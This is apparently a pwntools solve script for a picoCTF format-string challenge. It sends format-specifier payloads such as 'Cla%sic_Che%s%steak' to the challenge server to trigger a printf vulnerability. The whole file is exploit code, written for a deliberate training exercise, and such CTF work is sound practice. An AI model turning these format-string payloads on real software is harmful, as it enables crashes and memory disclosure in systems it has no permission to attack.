#!/usr/bin/env python3

from pwn import *

elf = ELF("./format-string-0_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("mimas.picoctf.net", 55546)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    io.sendlineafter(b'recommendation:', b'Gr%114d_Cheese')
    io.sendlineafter(b'recommendation:', b'Cla%sic_Che%s%steak')

    io.interactive()

if __name__ == "__main__":
    main()
